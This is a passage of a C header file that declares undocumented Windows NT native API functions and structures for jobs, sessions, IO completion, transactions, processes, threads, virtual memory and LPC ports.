    _Out_writes_bytes_(JobObjectInformationLength) PVOID JobObjectInformation,
    _In_ ULONG JobObjectInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationJobObject(
    _In_ HANDLE JobHandle,
    _In_ JOBOBJECTINFOCLASS JobObjectInformationClass,
    _In_reads_bytes_(JobObjectInformationLength) PVOID JobObjectInformation,
    _In_ ULONG JobObjectInformationLength);

NTSYSAPI
NTSTATUS
NTAPI
NtTerminateJobObject(
    _In_ HANDLE JobHandle,
    _In_ NTSTATUS ExitStatus);

/************************************************************************************
*
* Session API.
*
************************************************************************************/

typedef struct _SESSION_OBJECT {
    KEVENT Event;
    PVOID SessionGlobal; //MM_SESSION_SPACE ptr
} SESSION_OBJECT, * PSESSION_OBJECT;

//taken from ph2

typedef enum _IO_SESSION_EVENT {
    IoSessionEventIgnore,
    IoSessionEventCreated,
    IoSessionEventTerminated,
    IoSessionEventConnected,
    IoSessionEventDisconnected,
    IoSessionEventLogon,
    IoSessionEventLogoff,
    IoSessionEventMax
} IO_SESSION_EVENT;

typedef enum _IO_SESSION_STATE {
    IoSessionStateCreated = 1,
    IoSessionStateInitialized,
    IoSessionStateConnected,
    IoSessionStateDisconnected,
    IoSessionStateDisconnectedLoggedOn,
    IoSessionStateLoggedOn,
    IoSessionStateLoggedOff,
    IoSessionStateTerminated,
    IoSessionStateMax
} IO_SESSION_STATE;

NTSYSAPI
NTSTATUS
NTAPI
NtOpenSession(
    _Out_ PHANDLE SessionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtNotifyChangeSession(
    _In_ HANDLE SessionHandle,
    _In_ ULONG ChangeSequenceNumber,
    _In_ PLARGE_INTEGER ChangeTimeStamp,
    _In_ IO_SESSION_EVENT Event,
    _In_ IO_SESSION_STATE NewState,
    _In_ IO_SESSION_STATE PreviousState,
    _In_reads_bytes_opt_(PayloadSize) PVOID Payload,
    _In_ ULONG PayloadSize);

/************************************************************************************
*
* IO Completion API.
*
************************************************************************************/

typedef enum _IO_COMPLETION_INFORMATION_CLASS {
    IoCompletionBasicInformation
} IO_COMPLETION_INFORMATION_CLASS;

typedef struct _IO_COMPLETION_BASIC_INFORMATION {
    LONG Depth;
} IO_COMPLETION_BASIC_INFORMATION, *PIO_COMPLETION_BASIC_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI
NtCreateIoCompletion(
    _Out_ PHANDLE IoCompletionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ ULONG Count);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenIoCompletion(
    _Out_ PHANDLE IoCompletionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryIoCompletion(
    _In_ HANDLE IoCompletionHandle,
    _In_ IO_COMPLETION_INFORMATION_CLASS IoCompletionInformationClass,
    _Out_writes_bytes_(IoCompletionInformationLength) PVOID IoCompletionInformation,
    _In_ ULONG IoCompletionInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtSetIoCompletion(
    _In_ HANDLE IoCompletionHandle,
    _In_opt_ PVOID KeyContext,
    _In_opt_ PVOID ApcContext,
    _In_ NTSTATUS IoStatus,
    _In_ ULONG_PTR IoStatusInformation);

NTSYSAPI
NTSTATUS
NTAPI
NtSetIoCompletionEx(
    _In_ HANDLE IoCompletionHandle,
    _In_ HANDLE IoCompletionPacketHandle,
    _In_opt_ PVOID KeyContext,
    _In_opt_ PVOID ApcContext,
    _In_ NTSTATUS IoStatus,
    _In_ ULONG_PTR IoStatusInformation);

NTSYSAPI
NTSTATUS
NTAPI
NtRemoveIoCompletion(
    _In_ HANDLE IoCompletionHandle,
    _Out_ PVOID *KeyContext,
    _Out_ PVOID *ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_opt_ PLARGE_INTEGER Timeout);

/************************************************************************************
*
* Transactions API.
*
************************************************************************************/

//TmTx
NTSYSAPI
NTSTATUS
NTAPI
NtCreateTransaction(
    _Out_ PHANDLE TransactionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ LPGUID Uow,
    _In_opt_ HANDLE TmHandle,
    _In_ ULONG CreateOptions,
    _In_ ULONG IsolationLevel,
    _In_ ULONG IsolationFlags,
    _In_opt_ PLARGE_INTEGER Timeout,
    _In_opt_ PUNICODE_STRING Description);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenTransaction(
    _Out_ PHANDLE TransactionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ LPGUID Uow,
    _In_opt_ HANDLE TmHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtRollbackTransaction(
    _In_ HANDLE TransactionHandle,
    _In_ BOOLEAN Wait);

NTSYSAPI
NTSTATUS
NTAPI
NtCommitTransaction(
    _In_ HANDLE TransactionHandle,
    _In_ BOOLEAN Wait);

NTSYSAPI
NTSTATUS
NTAPI
NtFreezeTransactions(
    _In_ PLARGE_INTEGER FreezeTimeout,
    _In_ PLARGE_INTEGER ThawTimeout);

NTSYSAPI
NTSTATUS
NTAPI
NtThawTransactions(
    VOID);

//TmRm
NTSYSAPI
NTSTATUS
NTAPI
NtCreateResourceManager(
    _Out_ PHANDLE ResourceManagerHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ HANDLE TmHandle,
    _In_opt_ LPGUID ResourceManagerGuid,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ ULONG CreateOptions,
    _In_opt_ PUNICODE_STRING Description);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenResourceManager(
    _Out_ PHANDLE ResourceManagerHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ HANDLE TmHandle,
    _In_opt_ LPGUID ResourceManagerGuid,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes);

//TmEn
NTSYSAPI
NTSTATUS
NTAPI
NtCreateEnlistment(
    _Out_ PHANDLE EnlistmentHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ HANDLE ResourceManagerHandle,
    _In_ HANDLE TransactionHandle,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ ULONG CreateOptions,
    _In_ NOTIFICATION_MASK NotificationMask,
    _In_opt_ PVOID EnlistmentKey);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenEnlistment(
    _Out_ PHANDLE EnlistmentHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ HANDLE ResourceManagerHandle,
    _In_ LPGUID EnlistmentGuid,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes);

//TmTm
NTSYSAPI
NTSTATUS
NTAPI
NtCreateTransactionManager(
    _Out_ PHANDLE TmHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PUNICODE_STRING LogFileName,
    _In_ ULONG CreateOptions,
    _In_ ULONG CommitStrength);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenTransactionManager(
    _Out_ PHANDLE TmHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PUNICODE_STRING LogFileName,
    _In_opt_ LPGUID TmIdentity,
    _In_ ULONG OpenOptions);

/************************************************************************************
*
* Performance Counter.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtQueryPerformanceCounter(
    _Out_ PLARGE_INTEGER PerformanceCounter,
    _Out_opt_ PLARGE_INTEGER PerformanceFrequency);

NTSYSAPI
NTSTATUS
NTAPI
NtConvertBetweenAuxiliaryCounterAndPerformanceCounter(
    _In_ BOOLEAN ConvertAuxiliaryToPerformanceCounter,
    _In_ PLARGE_INTEGER PerformanceOrAuxiliaryCounterValue,
    _Out_ PLARGE_INTEGER ConvertedValue,
    _Out_opt_ PLARGE_INTEGER ConversionError);

/************************************************************************************
*
* Process and Thread API.
*
************************************************************************************/

typedef struct _INITIAL_TEB
{
    struct
    {
        PVOID OldStackBase;
        PVOID OldStackLimit;
    } OldInitialTeb;
    PVOID StackBase;
    PVOID StackLimit;
    PVOID StackAllocationBase;
} INITIAL_TEB, * PINITIAL_TEB;

#define PROCESS_GET_NEXT_FLAGS_PREVIOUS_PROCESS 0x00000001

#define QUEUE_USER_APC_FLAGS_NONE               0
#define QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC   1

//
// NtCreateProcessEx specific flags.
//
#define PS_REQUEST_BREAKAWAY        1
#define PS_NO_DEBUG_INHERIT         2
#define PS_INHERIT_HANDLES          4
#define PS_LARGE_PAGES              8
#define PS_ALL_FLAGS                (PS_REQUEST_BREAKAWAY | \
                                     PS_NO_DEBUG_INHERIT  | \
                                     PS_INHERIT_HANDLES   | \
                                     PS_LARGE_PAGES)

NTSYSAPI
NTSTATUS
NTAPI
NtGetNextProcess(
    _In_opt_ HANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ULONG HandleAttributes,
    _In_ ULONG Flags,
    _Out_ PHANDLE NewProcessHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtGetNextThread(
    _In_ HANDLE ProcessHandle,
    _In_ HANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ULONG HandleAttributes,
    _In_ ULONG Flags,
    _Out_ PHANDLE NewThreadHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateProcess(
    _Out_ PHANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ParentProcess,
    _In_ BOOLEAN InheritObjectTable,
    _In_opt_ HANDLE SectionHandle,
    _In_opt_ HANDLE DebugPort,
    _In_opt_ HANDLE ExceptionPort);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateProcessEx(
    _Out_ PHANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ParentProcess,
    _In_ ULONG Flags,
    _In_opt_ HANDLE SectionHandle,
    _In_opt_ HANDLE DebugPort,
    _In_opt_ HANDLE ExceptionPort,
    _In_ BOOLEAN InJob);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateUserProcess(
    _Out_ PHANDLE ProcessHandle,
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK ProcessDesiredAccess,
    _In_ ACCESS_MASK ThreadDesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ProcessObjectAttributes,
    _In_opt_ POBJECT_ATTRIBUTES ThreadObjectAttributes,
    _In_ ULONG ProcessFlags,
    _In_ ULONG ThreadFlags,
    _In_opt_ PVOID ProcessParameters,
    _Inout_ PPS_CREATE_INFO CreateInfo,
    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateThread(
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ProcessHandle,
    _Out_ PCLIENT_ID ClientId,
    _In_ PCONTEXT ThreadContext,
    _In_ PINITIAL_TEB InitialTeb,
    _In_ BOOLEAN CreateSuspended);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateThreadEx(
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ProcessHandle,
    _In_ PVOID StartRoutine,
    _In_opt_ PVOID Argument,
    _In_ ULONG CreateFlags, //THREAD_CREATE_FLAGS_*
    _In_opt_ ULONG_PTR ZeroBits,
    _In_opt_ SIZE_T StackSize,
    _In_opt_ SIZE_T MaximumStackSize,
    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenProcess(
    _Out_ PHANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PCLIENT_ID ClientId);

NTSYSAPI
NTSTATUS
NTAPI
NtTerminateProcess(
    _In_opt_ HANDLE ProcessHandle,
    _In_ NTSTATUS ExitStatus);

NTSYSAPI
NTSTATUS
NTAPI
NtSuspendProcess(
    _In_ HANDLE ProcessHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtResumeProcess(
    _In_ HANDLE ProcessHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateProcessStateChange(
    _Out_ PHANDLE ProcessStateChangeHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ProcessHandle,
    _In_opt_ ULONG64 Reserved);

NTSYSAPI
NTSTATUS
NTAPI
NtChangeProcessState(
    _In_ HANDLE ProcessStateChangeHandle,
    _In_ HANDLE ProcessHandle,
    _In_ PROCESS_STATE_CHANGE_TYPE StateChangeType,
    _In_opt_ PVOID ExtendedInformation,
    _In_opt_ SIZE_T ExtendedInformationLength,
    _In_opt_ ULONG64 Reserved);

NTSYSAPI
NTSTATUS
NTAPI
NtSuspendThread(
    _In_ HANDLE ThreadHandle,
    _Out_opt_ PULONG PreviousSuspendCount);

NTSYSAPI
NTSTATUS
NTAPI
NtResumeThread(
    _In_ HANDLE ThreadHandle,
    _Out_opt_ PULONG PreviousSuspendCount);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateThreadStateChange(
    _Out_ PHANDLE ThreadStateChangeHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ThreadHandle,
    _In_opt_ ULONG64 Reserved);

NTSYSAPI
NTSTATUS
NTAPI
NtChangeThreadState(
    _In_ HANDLE ThreadStateChangeHandle,
    _In_ HANDLE ThreadHandle,
    _In_ THREAD_STATE_CHANGE_TYPE StateChangeType,
    _In_opt_ PVOID ExtendedInformation,
    _In_opt_ SIZE_T ExtendedInformationLength,
    _In_opt_ ULONG64 Reserved);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenThread(
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PCLIENT_ID ClientId);

NTSYSAPI
NTSTATUS
NTAPI
NtTerminateThread(
    _In_opt_ HANDLE ThreadHandle,
    _In_ NTSTATUS ExitStatus);

NTSYSAPI
NTSTATUS
NTAPI
NtImpersonateThread(
    _In_ HANDLE ServerThreadHandle,
    _In_ HANDLE ClientThreadHandle,
    _In_ PSECURITY_QUALITY_OF_SERVICE SecurityQos);

NTSYSAPI
NTSTATUS
NTAPI
NtSetContextThread(
    _In_ HANDLE ThreadHandle,
    _In_ PCONTEXT ThreadContext);

NTSYSAPI
NTSTATUS
NTAPI
NtGetContextThread(
    _In_ HANDLE ThreadHandle,
    _Inout_ PCONTEXT ThreadContext);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryInformationThread(
    _In_ HANDLE ThreadHandle,
    _In_ THREADINFOCLASS ThreadInformationClass,
    _Out_writes_bytes_(ThreadInformationLength) PVOID ThreadInformation,
    _In_ ULONG ThreadInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationThread(
    _In_ HANDLE ThreadHandle,
    _In_ THREADINFOCLASS ThreadInformationClass,
    _In_reads_bytes_(ThreadInformationLength) PVOID ThreadInformation,
    _In_ ULONG ThreadInformationLength);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryInformationProcess(
    _In_ HANDLE ProcessHandle,
    _In_ PROCESSINFOCLASS ProcessInformationClass,
    _Out_writes_bytes_(ProcessInformationLength) PVOID ProcessInformation,
    _In_ ULONG ProcessInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationProcess(
    _In_ HANDLE ProcessHandle,
    _In_ PROCESSINFOCLASS ProcessInformationClass,
    _In_reads_bytes_(ProcessInformationLength) PVOID ProcessInformation,
    _In_ ULONG ProcessInformationLength);

typedef VOID(*PPS_APC_ROUTINE) (
    _In_opt_ PVOID ApcArgument1,
    _In_opt_ PVOID ApcArgument2,
    _In_opt_ PVOID ApcArgument3);

NTSYSAPI
NTSTATUS
NTAPI
NtQueueApcThread(
    _In_ HANDLE ThreadHandle,
    _In_ PPS_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcArgument1,
    _In_opt_ PVOID ApcArgument2,
    _In_opt_ PVOID ApcArgument3);

NTSYSAPI
NTSTATUS
NTAPI
NtQueueApcThreadEx(
    _In_ HANDLE ThreadHandle,
    _In_opt_ HANDLE ReserveHandle,
    _In_ PPS_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcArgument1,
    _In_opt_ PVOID ApcArgument2,
    _In_opt_ PVOID ApcArgument3);

NTSYSAPI
NTSTATUS
NTAPI
NtQueueApcThreadEx2(
    _In_ HANDLE ThreadHandle,
    _In_ HANDLE UserApcReserveHandle,
    _In_ ULONG QueueUserApcFlags, /*QUEUE_USER_APC_FLAGS*/
    _In_ PPS_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID SystemArgument1,
    _In_opt_ PVOID SystemArgument2,
    _In_opt_ PVOID SystemArgument3);

NTSYSAPI
NTSTATUS
NTAPI
NtYieldExecution(
    VOID);

NTSYSAPI
NTSTATUS
NTAPI
NtTestAlert(
    VOID);

NTSYSAPI
NTSTATUS
NTAPI
NtAlertThread(
    _In_ HANDLE ThreadHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtAlertResumeThread(
    _In_ HANDLE ThreadHandle,
    _Out_opt_ PULONG PreviousSuspendCount);

NTSYSAPI
NTSTATUS
NTAPI
NtAlertThreadByThreadId(
    _In_ HANDLE ThreadId);

NTSYSAPI
NTSTATUS
NTAPI
NtWaitForAlertByThreadId(
    _In_ PVOID Address,
    _In_opt_ PLARGE_INTEGER Timeout);

NTSYSAPI
NTSTATUS
NTAPI
NtDelayExecution(
    _In_ BOOLEAN Alertable,
    _In_opt_ PLARGE_INTEGER DelayInterval);

NTSYSAPI
ULONG
NTAPI
NtGetCurrentProcessorNumber(
    VOID);

/************************************************************************************
*
* License API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtQueryLicenseValue(
    _In_ PUNICODE_STRING ValueName,
    _Out_opt_ PULONG Type,
    _Out_writes_bytes_to_opt_(DataSize, *ResultDataSize) PVOID Data,
    _In_ ULONG DataSize,
    _Out_ PULONG ResultDataSize);

/************************************************************************************
*
* Virtual Memory API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtAllocateVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize)) PVOID *BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG AllocationType,
    _In_ ULONG Protect);

NTSYSAPI
NTSTATUS
NTAPI
NtAllocateVirtualMemoryEx(
    _In_ HANDLE ProcessHandle,
    _Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize)) PVOID* BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG AllocationType,
    _In_ ULONG PageProtection,
    _Inout_updates_opt_(ExtendedParameterCount) PMEM_EXTENDED_PARAMETER ExtendedParameters,
    _In_ ULONG ExtendedParameterCount);

NTSYSAPI
NTSTATUS
NTAPI
NtFreeVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID *BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG FreeType);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_ MEMORY_INFORMATION_CLASS MemoryInformationClass,
    _Out_writes_bytes_(MemoryInformationLength) PVOID MemoryInformation,
    _In_ SIZE_T MemoryInformationLength,
    _Out_opt_ PSIZE_T ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_ VIRTUAL_MEMORY_INFORMATION_CLASS VmInformationClass,
    _In_ ULONG_PTR NumberOfEntries,
    _In_reads_(NumberOfEntries) PMEMORY_RANGE_ENTRY VirtualAddresses,
    _In_reads_bytes_(VmInformationLength) PVOID VmInformation,
    _In_ ULONG VmInformationLength);

NTSYSAPI
NTSTATUS
NTAPI
NtReadVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _Out_writes_bytes_(BufferSize) PVOID Buffer,
    _In_ SIZE_T BufferSize,
    _Out_opt_ PSIZE_T NumberOfBytesRead);

NTSYSAPI
NTSTATUS
NTAPI
NtReadVirtualMemoryEx(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _Out_writes_bytes_(BufferSize) PVOID Buffer,
    _In_ SIZE_T BufferSize,
    _Out_opt_ PSIZE_T NumberOfBytesRead,
    _In_ ULONG Flags);

NTSYSAPI
NTSTATUS
NTAPI
NtWriteVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_reads_bytes_(BufferSize) PVOID Buffer,
    _In_ SIZE_T BufferSize,
    _Out_opt_ PSIZE_T NumberOfBytesWritten);

NTSYSAPI
NTSTATUS
NTAPI
NtProtectVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID *BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG NewProtect,
    _Out_ PULONG OldProtect);

#define MAP_PROCESS 1L
#define MAP_SYSTEM  2L

NTSYSAPI
NTSTATUS
NTAPI
NtLockVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID *BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG MapType);

NTSYSAPI
NTSTATUS
NTAPI
NtUnlockVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID *BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG MapType);

NTSTATUS
NTAPI
NtFlushVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID* BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _Out_ struct _IO_STATUS_BLOCK* IoStatus);

NTSYSAPI
NTSTATUS
NTAPI
NtFlushInstructionCache(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_ SIZE_T Length);

NTSYSAPI
NTSTATUS
NTAPI
NtCreatePagingFile(
    _In_ PUNICODE_STRING PageFileName,
    _In_ PLARGE_INTEGER MinimumSize,
    _In_ PLARGE_INTEGER MaximumSize,
    _In_ ULONG Priority);

/************************************************************************************
*
* Port API.
*
************************************************************************************/

typedef struct _PORT_VIEW {

    ULONG  Length;                      // Size of this structure
    HANDLE SectionHandle;               // Handle to section object with
                                        // SECTION_MAP_WRITE and SECTION_MAP_READ
    ULONG  SectionOffset;               // The offset in the section to map a view for
                                        // the port data area. The offset must be aligned 
                                        // with the allocation granularity of the system.
    SIZE_T ViewSize;                    // The size of the view (in bytes)
    PVOID  ViewBase;                    // The base address of the view in the creator
                                        // 
    PVOID  ViewRemoteBase;              // The base address of the view in the process
                                        // connected to the port.
} PORT_VIEW, * PPORT_VIEW;

typedef struct _REMOTE_PORT_VIEW {

    ULONG  Length;                      // Size of this structure
    SIZE_T ViewSize;                    // The size of the view (bytes)
    PVOID  ViewBase;                    // Base address of the view

} REMOTE_PORT_VIEW, * PREMOTE_PORT_VIEW;

typedef struct _PORT_MESSAGE {
    union {
        struct {
            CSHORT DataLength;
            CSHORT TotalLength;
        } s1;
        ULONG Length;
    } u1;
    union {
        struct {
            CSHORT Type;
            CSHORT DataInfoOffset;
        } s2;
        ULONG ZeroInit;
    } u2;
    union {
        CLIENT_ID ClientId;
        double DoNotUseThisField;       // Force quadword alignment
    } u3;
    ULONG MessageId;
    union {
        SIZE_T ClientViewSize;               // Only valid on LPC_CONNECTION_REQUEST message
        ULONG CallbackId;                   // Only valid on LPC_REQUEST message
    } u4;
} PORT_MESSAGE, *PPORT_MESSAGE;

typedef struct _PORT_MESSAGE32 {
    union {
        struct {
            CSHORT DataLength;
            CSHORT TotalLength;
        } s1;
        ULONG Length;
    } u1;
    union {
        struct {
            CSHORT Type;
            CSHORT DataInfoOffset;
        } s2;
        ULONG ZeroInit;
    } u2;
    union {
        CLIENT_ID32 ClientId;
        double DoNotUseThisField;       // Force quadword alignment
    } u3;
    ULONG MessageId;
    union {
        ULONG ClientViewSize;               // Only valid on LPC_CONNECTION_REQUEST message
        ULONG CallbackId;                   // Only valid on LPC_REQUEST message
    } u4;
} PORT_MESSAGE32, * PPORT_MESSAGE32;

typedef struct _PORT_MESSAGE64
{
    union
    {
        struct
        {
            CSHORT DataLength;
            CSHORT TotalLength;
        } s1;
        ULONG Length;
    } u1;
    union
    {
        struct
        {
            CSHORT Type;
            CSHORT DataInfoOffset;
        } s2;
        ULONG ZeroInit;
    } u2;
    union
    {
        CLIENT_ID64 ClientId;
        double DoNotUseThisField;
    };
    ULONG MessageId;
    union
    {
        ULONGLONG ClientViewSize; // only valid for LPC_CONNECTION_REQUEST messages
        ULONG CallbackId; // only valid for LPC_REQUEST messages
    };
} PORT_MESSAGE64, * PPORT_MESSAGE64;

typedef struct _PORT_DATA_ENTRY {
    PVOID Base;
    ULONG Size;
} PORT_DATA_ENTRY, *PPORT_DATA_ENTRY;

typedef struct _PORT_DATA_INFORMATION {
    ULONG CountDataEntries;
    PORT_DATA_ENTRY DataEntries[1];
} PORT_DATA_INFORMATION, *PPORT_DATA_INFORMATION;

#ifndef InitializeMessageHeader
#define InitializeMessageHeader(ph, l, t)                              \
{                                                                      \
    (ph)->u1.s1.TotalLength      = (USHORT)(l);                        \
    (ph)->u1.s1.DataLength       = (USHORT)(l - sizeof(PORT_MESSAGE)); \
    (ph)->u2.s2.Type             = (USHORT)(t);                        \
    (ph)->u2.s2.DataInfoOffset   = 0;                                  \
    (ph)->ClientId.UniqueProcess = NULL;                               \
    (ph)->ClientId.UniqueThread  = NULL;                               \
    (ph)->MessageId              = 0;                                  \
    (ph)->ClientViewSize         = 0;                                  \
}
#endif

#define LPC_REQUEST                 1
#define LPC_REPLY                   2
#define LPC_DATAGRAM                3
#define LPC_LOST_REPLY              4
#define LPC_PORT_CLOSED             5
#define LPC_CLIENT_DIED             6
#define LPC_EXCEPTION               7
#define LPC_DEBUG_EVENT             8
#define LPC_ERROR_EVENT             9
#define LPC_CONNECTION_REQUEST      10
#define LPC_CONTINUATION_REQUIRED   0x2000


#define PORT_VALID_OBJECT_ATTRIBUTES (OBJ_CASE_INSENSITIVE)
#define PORT_MAXIMUM_MESSAGE_LENGTH 256

typedef struct _LPC_CLIENT_DIED_MSG {
    PORT_MESSAGE PortMsg;
    LARGE_INTEGER CreateTime;
} LPC_CLIENT_DIED_MSG, *PLPC_CLIENT_DIED_MSG;

NTSYSAPI
NTSTATUS
NTAPI
NtCreatePort(
    _Out_ PHANDLE PortHandle,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ ULONG MaxConnectionInfoLength,
    _In_ ULONG MaxMessageLength,
    _In_ ULONG MaxPoolUsage);

NTSYSAPI
NTSTATUS
NTAPI
NtCompleteConnectPort(
    _In_ HANDLE PortHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtListenPort(
    _In_ HANDLE PortHandle,
    _Out_ PPORT_MESSAGE ConnectionRequest);

NTSYSAPI
NTSTATUS
NTAPI
NtReplyPort(
    _In_ HANDLE PortHandle,
    _In_ PPORT_MESSAGE ReplyMessage);

NTSYSAPI
NTSTATUS
NTAPI
NtReplyWaitReplyPort(
    _In_ HANDLE PortHandle,
    _Inout_ PPORT_MESSAGE ReplyMessage);

NTSYSAPI
NTSTATUS
NTAPI
NtRequestPort(
    _In_ HANDLE PortHandle,
    _In_ PPORT_MESSAGE RequestMessage);

NTSYSAPI
NTSTATUS
NTAPI
NtRequestWaitReplyPort(
    _In_ HANDLE PortHandle,
    _In_ PPORT_MESSAGE RequestMessage,
    _Out_ PPORT_MESSAGE ReplyMessage);

NTSYSAPI
NTSTATUS
NTAPI
NtClosePort(
    _In_ HANDLE PortHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtReplyWaitReceivePort(
    _In_ HANDLE PortHandle,
    _Out_opt_ PVOID *PortContext,
    _In_opt_ PPORT_MESSAGE ReplyMessage,
    _Out_ PPORT_MESSAGE ReceiveMessage);

NTSYSAPI
NTSTATUS
NTAPI
NtWriteRequestData(
    _In_ HANDLE PortHandle,
    _In_ PPORT_MESSAGE Message,
    _In_ ULONG DataEntryIndex,
    _In_ PVOID Buffer,
    _In_ ULONG BufferSize,
    _Out_opt_ PULONG NumberOfBytesWritten);

NTSYSAPI
NTSTATUS
NTAPI
NtReadRequestData(
    _In_ HANDLE PortHandle,
    _In_ PPORT_MESSAGE Message,
